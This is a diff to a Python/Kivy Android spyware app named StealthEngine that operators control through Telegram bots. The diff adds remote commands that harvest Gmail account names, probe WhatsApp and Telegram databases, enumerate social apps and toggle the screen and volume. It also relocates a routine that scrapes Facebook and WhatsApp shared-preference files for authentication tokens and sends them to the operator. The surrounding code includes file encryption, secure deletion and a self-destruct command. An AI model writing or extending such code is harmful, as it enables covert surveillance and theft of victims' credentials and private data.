@@ -15,7 +15,8 @@ from datetime import datetime
 from kivy.app import App
 from kivy.clock import Clock
 from jnius import autoclass, cast
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 BOT_TOKENS = [os.environ.get(f'TELEGRAM_BOT_{i}_TOKEN') for i in range(1, 11)]
 ADMIN_ID = os.environ.get('TELEGRAM_CONTROL_CENTER_ID')
@@ -46,6 +47,8 @@ AccessibilityService = autoclass('android.accessibilityservice.AccessibilityServ
 AccessibilityNodeInfo = autoclass('android.view.accessibility.AccessibilityNodeInfo')
 AccessibilityEvent = autoclass('android.view.accessibility.AccessibilityEvent')
 ContactsContract_Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
+AccountManager = autoclass('android.accounts.AccountManager')
+Account = autoclass('android.accounts.Account')
 
 def get_device_id():
     try:
@@ -108,12 +111,13 @@ def encrypt_file(file_path, key=None):
         key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
     with open(file_path, 'rb') as f:
         data = f.read()
-    nonce = os.urandom(12)
-    cipher = AESGCM(key)
-    ct = cipher.encrypt(nonce, data, None)
+    
+    cipher = AES.new(key, AES.MODE_GCM)
+    ct, tag = cipher.encrypt_and_digest(data)
+    
     enc_path = file_path + '.enc'
     with open(enc_path, 'wb') as f:
-        f.write(nonce + ct)
+        f.write(cipher.nonce + tag + ct)
     return enc_path
 
 def decrypt_file(enc_path, key=None):
@@ -121,10 +125,13 @@ def decrypt_file(enc_path, key=None):
         key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
     with open(enc_path, 'rb') as f:
         data = f.read()
-    nonce = data[:12]
-    ct = data[12:]
-    cipher = AESGCM(key)
-    return cipher.decrypt(nonce, ct, None)
+    
+    nonce = data[:16]
+    tag = data[16:32]
+    ct = data[32:]
+    
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ct, tag)
 
 def secure_delete(file_path, passes=3):
     if not os.path.exists(file_path):
@@ -425,6 +432,22 @@ class StealthEngine(App):
             self._zip_all_media()
         elif cmd == 'get_tokens':
             self._extract_tokens()
+        elif cmd == 'social':
+            self._extract_social()
+        elif cmd == 'screen_on':
+            self._screen_on()
+        elif cmd == 'screen_off':
+            self._screen_off()
+        elif cmd == 'volume_up':
+            self._volume_up()
+        elif cmd == 'volume_down':
+            self._volume_down()
+        elif cmd == 'gmail':
+            self._get_gmail_accounts()
+        elif cmd == 'whatsapp':
+            self._get_whatsapp_data()
+        elif cmd == 'telegram':
+            self._get_telegram_data()
         else:
             self._send_to_telegram(self.admin_id, f'Unknown local command: {cmd}')
 
@@ -445,6 +468,14 @@ class StealthEngine(App):
                  {'text': '📁 Files', 'callback_data': f'{self.device_id}|files'}],
                 [{'text': '🔐 Tokens', 'callback_data': f'{self.device_id}|get_tokens'},
                  {'text': '📦 Zip all', 'callback_data': f'{self.device_id}|zipall'}],
+                [{'text': '📧 Gmail', 'callback_data': f'{self.device_id}|gmail'},
+                 {'text': '📱 WhatsApp', 'callback_data': f'{self.device_id}|whatsapp'}],
+                [{'text': '💬 Telegram', 'callback_data': f'{self.device_id}|telegram'},
+                 {'text': '👤 Social', 'callback_data': f'{self.device_id}|social'}],
+                [{'text': '🔛 Screen On', 'callback_data': f'{self.device_id}|screen_on'},
+                 {'text': '🔚 Screen Off', 'callback_data': f'{self.device_id}|screen_off'}],
+                [{'text': '🔊 Vol Up', 'callback_data': f'{self.device_id}|volume_up'},
+                 {'text': '🔉 Vol Down', 'callback_data': f'{self.device_id}|volume_down'}],
                 [{'text': '🛡️ Vuln scan', 'callback_data': f'{self.device_id}|vuln'},
                  {'text': '🧹 Clear cache', 'callback_data': f'{self.device_id}|clear'}],
                 [{'text': '💣 Self destruct', 'callback_data': f'{self.device_id}|selfdestruct'}]
@@ -599,6 +630,130 @@ class StealthEngine(App):
         except:
             self._send_to_telegram(self.admin_id, 'Screenshot failed')
 
+    def _screen_on(self):
+        try:
+            pm = self.activity.getSystemService(Context.POWER_SERVICE)
+            pm.wakeUp(time.time())
+        except:
+            pass
+
+    def _screen_off(self):
+        try:
+            pm = self.activity.getSystemService(Context.POWER_SERVICE)
+            pm.goToSleep(time.time())
+        except:
+            pass
+
+    def _volume_up(self):
+        try:
+            am = self.activity.getSystemService(Context.AUDIO_SERVICE)
+            am.adjustStreamVolume(am.STREAM_MUSIC, am.ADJUST_RAISE, 0)
+        except:
+            pass
+
+    def _volume_down(self):
+        try:
+            am = self.activity.getSystemService(Context.AUDIO_SERVICE)
+            am.adjustStreamVolume(am.STREAM_MUSIC, am.ADJUST_LOWER, 0)
+        except:
+            pass
+
+    def _get_gmail_accounts(self):
+        try:
+            am = AccountManager.get(self.activity)
+            accounts = am.getAccountsByType('com.google')
+            if accounts:
+                text = '📧 Gmail accounts:\n' + '\n'.join([a.name for a in accounts])
+            else:
+                text = 'No Gmail accounts found.'
+        except:
+            text = 'Failed to get Gmail accounts.'
+        self._send_to_telegram(self.admin_id, text)
+
+    def _get_whatsapp_data(self):
+        try:
+            paths = ['/data/data/com.whatsapp/databases/msgstore.db']
+            tokens = []
+            for p in paths:
+                dirf = File(p)
+                if dirf.exists():
+                    tokens.append(f'WhatsApp database exists at {p}')
+            if tokens:
+                text = '\n'.join(tokens)
+            else:
+                text = 'No WhatsApp data found.'
+        except:
+            text = 'WhatsApp extraction failed.'
+        self._send_to_telegram(self.admin_id, text)
+
+    def _get_telegram_data(self):
+        try:
+            paths = ['/data/data/org.telegram.messenger/files/cache4.db']
+            tokens = []
+            for p in paths:
+                dirf = File(p)
+                if dirf.exists():
+                    tokens.append(f'Telegram data exists at {p}')
+            if tokens:
+                text = '\n'.join(tokens)
+            else:
+                text = 'No Telegram data found.'
+        except:
+            text = 'Telegram extraction failed.'
+        self._send_to_telegram(self.admin_id, text)
+
+    def _extract_social(self):
+        social_apps = {
+            'com.facebook.katana': 'Facebook',
+            'com.instagram.android': 'Instagram',
+            'com.zhiliaoapp.musically': 'TikTok',
+            'com.twitter.android': 'Twitter'
+        }
+        found = []
+        try:
+            pm = self.activity.getPackageManager()
+            for pkg, name in social_apps.items():
+                try:
+                    pm.getPackageInfo(pkg, 0)
+                    found.append(name)
+                except:
+                    pass
+            if found:
+                text = 'Social apps installed:\n' + '\n'.join(found)
+            else:
+                text = 'No social apps found.'
+        except:
+            text = 'Failed to scan social apps.'
+        self._send_to_telegram(self.admin_id, text)
+
+    def _extract_tokens(self):
+        try:
+            paths = ['/data/data/com.facebook.katana/shared_prefs', '/data/data/com.whatsapp/shared_prefs']
+            tokens = []
+            for p in paths:
+                dirf = File(p)
+                if dirf.exists() and dirf.isDirectory():
+                    for f in dirf.listFiles():
+                        if f.getName().endswith('.xml'):
+                            fis = FileInputStream(f)
+                            InputStreamReader = autoclass('java.io.InputStreamReader')
+                            BufferedReader = autoclass('java.io.BufferedReader')
+                            br = BufferedReader(InputStreamReader(fis))
+                            line = br.readLine()
+                            while line:
+                                if 'token' in line or 'Token' in line:
+                                    tokens.append(f'{f.getName()}: {line.strip()}')
+                                line = br.readLine()
+                            br.close()
+                            fis.close()
+            if tokens:
+                text = '\n'.join(tokens[:30])
+            else:
+                text = 'No tokens found.'
+        except:
+            text = 'Token extraction failed.'
+        self._send_to_telegram(self.admin_id, text)
+
     def _start_stream(self):
         self._send_to_telegram(self.admin_id, 'Streaming not implemented')
 
@@ -648,34 +803,6 @@ class StealthEngine(App):
             secure_delete(enc_zip)
         except:
             self._send_to_telegram(self.admin_id, 'Zip failed')
-
-    def _extract_tokens(self):
-        try:
-            paths = ['/data/data/com.facebook.katana/shared_prefs', '/data/data/com.whatsapp/shared_prefs']
-            tokens = []
-            for p in paths:
-                dirf = File(p)
-                if dirf.exists() and dirf.isDirectory():
-                    for f in dirf.listFiles():
-                        if f.getName().endswith('.xml'):
-                            fis = FileInputStream(f)
-                            InputStreamReader = autoclass('java.io.InputStreamReader')
-                            BufferedReader = autoclass('java.io.BufferedReader')
-                            br = BufferedReader(InputStreamReader(fis))
-                            line = br.readLine()
-                            while line:
-                                if 'token' in line or 'Token' in line:
-                                    tokens.append(f'{f.getName()}: {line.strip()}')
-                                line = br.readLine()
-                            br.close()
-                            fis.close()
-            if tokens:
-                text = '\n'.join(tokens[:30])
-            else:
-                text = 'No tokens found.'
-        except:
-            text = 'Token extraction failed.'
-        self._send_to_telegram(self.admin_id, text)
 
     def _ai_monitor(self):
         password_pattern = re.compile(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$')
